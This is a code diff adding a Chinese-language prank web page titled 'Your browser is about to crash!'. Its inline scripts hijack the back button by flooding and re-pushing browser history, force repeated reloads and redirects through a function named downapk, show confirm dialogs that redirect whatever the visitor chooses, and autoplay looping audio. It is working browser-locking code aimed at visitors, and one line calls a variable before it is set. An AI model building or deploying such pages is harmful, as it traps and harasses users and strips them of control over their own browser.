@@ -1,0 +1,164 @@
+﻿<!DOCTYPE html>
+<html><head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="./files/index.css">
+    <title>你的浏览器要死机了！</title>
+</head>
+
+<body id="zendong">
+    <script>
+        function pushHistory() {
+            var state = {
+                title: "title",
+                url: "#"
+            };
+            window.history.pushState(null, null, document.URL);
+            window.addEventListener("popstate",
+                function (e) {
+                    window.history.pushState(null, null, document.URL)
+                },
+                false)
+        }
+        function log(msg) {
+            if (location.href.indexOf('abcde') === -1) return;
+            var logbox = document.getElementById('logmsg');
+            if (!logbox) {
+                logbox = document.createElement('div');
+                logbox.id = 'logmsg';
+                if (!document.body) return;
+                document.body.insertBefore(logbox, document.body.firstElementChild)
+            }
+            var line = document.createElement('div');
+            line.innerText = msg;
+            if (!logbox) return;
+            logbox.style = 'font-size: 24px;padding: 5 15;background-color: #555;color: white;';
+            logbox.appendChild(line)
+        }
+        pushHistory(t + '#');
+        if (window.history && window.history.pushState) {
+            log('支持pushState.');
+            var t = location.href;
+            log('回退至:' + t);
+            pushHistory(t + '#2');
+            pushHistory(t + '##3');
+            pushHistory(t + '###4');
+            pushHistory(t + '####5');
+            var ii = 0,
+                jj = 0;
+            setInterval(function () {
+                if (ii > 10) return;
+                ii++
+            },
+                200);
+            setInterval(function () {
+                if (jj > 10) return;
+                jj++;
+                pushHistory()
+            },
+                1000);
+            window.addEventListener("popstate",
+                function (e) {
+                    log('popstate.刷新');
+                    location.reload()
+                },
+                false);
+            window.onpopstate = function () {
+                window.history.pushState('forward', null, '#6');
+                window.history.forward(1);
+                log('onpopstate.刷新');
+                location.reload()
+            }
+        } else { }
+        document.body.click();
+        setTimeout(function () {
+            document.body.click();
+            downapk()
+        },
+            200);
+        var count = 0;
+        setTimeout(function () {
+            setInterval(function () {
+                if (count < 3) {
+                    count++;
+                    downapk()
+                }
+            },
+                5000)
+        },
+            3000);
+    </script>
+    
+    <script>
+        function urldizhi2() {
+            var time = new Date();
+            var min = time.getMinutes();
+            var hours = time.getHours();
+            var s = time.getSeconds();
+            var num = Math.random().toFixed(2) * 400 + 100;
+            var num2 = Math.random().toFixed(2) * 400 + 100;
+            var num3 = Math.random().toFixed(2) * 400 + 100;
+            var surl3 = "./index.html";
+            return surl3;
+        }
+    </script>
+    <div class="liulanqi1bgobox" onclick="downapk()">
+        <div class="ql-head className" style="position:relative;">你的浏览器要死机了！</div>
+        <div class="ql-img"><img src="./files/index.webp"></div>
+        <div class="ql-shilian">测试！看看你的浏览器能不能死机</div>
+    </div>
+    <script language="javascript">
+        var i = 0;
+        var j = 0;
+        function time() {
+            i++;
+            if (i < 7) {
+                setTimeout(time, 200);
+            } else if (i == 7) {
+                tanc();
+            }
+        }
+
+        setTimeout(function () {
+            time();
+        }, 1000);
+        function tanc() {
+            var msg = confirm("你的浏览器要死机了！");
+            if (msg == true || 1) {
+                surl3 = urldizhi();
+                location.href = surl3;
+
+            }
+        }
+        function tuitanc() {
+            var msg = confirm("你的浏览器要死机了！");
+            // if (msg == true) {
+            surl3 = urldizhi();
+            location.href = surl3;
+
+            //  }
+        }
+        // 
+        function urldizhi() {
+            var time = new Date();
+            var min = time.getMinutes();
+            var hours = time.getHours();
+            var s = time.getSeconds();
+            var num = Math.random().toFixed(2) * 400 + 100;
+            var num2 = Math.random().toFixed(2) * 400 + 100;
+            var num3 = Math.random().toFixed(2) * 400 + 100;
+            var surl3 = "./index.html";
+
+            return surl3;
+        }
+        function downapk() {
+            surl3 = urldizhi();
+            location.href = surl3;
+        }
+    </script>
+    <audio autoplay="autoplay" preload="" loop>
+        <source src="./files/index.mp3" type="audio/mpeg">
+    </audio>
+</body></html>
